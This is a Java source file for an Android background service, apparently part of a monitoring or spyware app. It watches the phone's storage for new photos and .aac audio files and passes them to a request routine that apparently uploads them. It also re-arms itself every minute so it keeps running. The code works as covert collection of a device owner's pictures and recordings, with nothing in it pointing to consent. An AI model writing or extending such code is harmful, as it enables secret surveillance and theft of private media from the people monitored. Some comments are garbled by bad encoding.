package custom.fileobserver;

import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.concurrent.TimeUnit;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;

import com.inet.android.request.ConstantValue;
import com.inet.android.request.RequestList;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;

public class FileObserverService extends Service {
	private static final int SERVICE_REQUEST_CODE = 21;
	private final static String LOG_TAG = FileObserverService.class
			.getSimpleName().toString();
	private int isImageObserver = 0;
	private int isAudioObserver = 0;
	private FileObserver fileObs = null;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	public void onCreate() {
		super.onCreate();
	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		Logging.doLog(LOG_TAG, "FileObserverService", "FileObserverService");

		// ----------restart service
		// ---------------------------------------------------
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, 1);// ����� 5 �����
		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this,
						FileObserverService.class),// SERVICE_REQUEST_CODE
													// -
													// ����������
													// int
													// �������
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);

		isImageObserver = ValueWork.getState(ConstantValue.TYPE_IMAGE_REQUEST,
				this);
		isAudioObserver = ValueWork.getState(ConstantValue.TYPE_AUDIO_REQUEST,
				this);
		Logging.doLog(LOG_TAG, "state observer: " + isImageObserver,
				"state observer: " + isAudioObserver);

		if (isImageObserver == 0 && isAudioObserver == 0) {
			stopWatcher();
			return 0;
		}

		
		if (fileObs != null) {
			Logging.doLog(LOG_TAG, "start" + fileObs.getState(), "start"
					+ fileObs.getState());
			if (fileObs.getState() == false) {
				startWatcher();
			}
		} else
			startWatcher();

		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	/*
	 * Start monitoring the creation of files in memory
	 */
	public void startWatcher() {
		Logging.doLog(LOG_TAG, "startWatcher", "startWatcher");

		String sdcard = Environment.getExternalStorageDirectory()
				.getAbsolutePath();
		String sdcard2 = "/sdcard2";
		String sdcardMnt = "/mnt/sdcard2";
		String sdcardExt = "/mnt/extSdCard";
		String sdcardSd = "/sdcard/.externalSD";

		ArrayList<String> dirList = new ArrayList<String>();
		dirList.add(sdcard);
		dirList.add(sdcard2);
		dirList.add(sdcardMnt);
		dirList.add(sdcardExt);
		dirList.add(sdcardSd);

		for (String item : dirList) {
			File file = new File(item);
			if (file.exists() && file.isDirectory()) {

				Logging.doLog(LOG_TAG, "FileWatcher = create " + item,
						"FileWatcher = create" + item);
				fileObs = new FileObserver(item, true, FileObserver.CLOSE_WRITE) {
					@Override
					public void onEvent(int event, int cookie, String path) {
						// TODO Auto-generated method stub
						filterFile(path);
					}
				};
				Logging.doLog(LOG_TAG, "FileListener", "FileListener");
				// mWatcher.setFileListener(mFileListener);
				Logging.doLog(LOG_TAG, "startWatcher", "startWatcher");
				fileObs.startWatching();
			}
		}
	}

	private void filterFile(String path) {
		int typeValue = -1;
		if (path.endsWith(".jpg") || path.endsWith(".png")
				|| path.endsWith(".gif") || path.endsWith(".bpm")) {
			if (!RequestList.getLastFile().equals(path) && isImageObserver == 1) {
				RequestList.setLastFile(path);
				try {
					TimeUnit.MILLISECONDS.sleep(1000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			} else
				return;
			typeValue = ConstantValue.TYPE_IMAGE_REQUEST;
			Logging.doLog(LOG_TAG, "data[image]", "data[image]");
		}
		if (path.endsWith(".aac") && isAudioObserver == 1) {
			Logging.doLog(LOG_TAG, "ath.endsWith(.aac) && audio.equals(1)",
					"ath.endsWith(.aac) && audio.equals(1)");
			Logging.doLog(LOG_TAG, "data[audio]", "data[audio]");

			if (RequestList.getLastFile().equals(path))
				typeValue = ConstantValue.TYPE_AUDIO_REQUEST;
			else
				RequestList.setLastFile(path);

		}
		if (typeValue == -1)
			return;
		RequestList.sendFileRequest(typeValue, path, this);
	}

	public void stopWatcher() {
		if (fileObs != null)
			fileObs.stopWatching();
	}
}
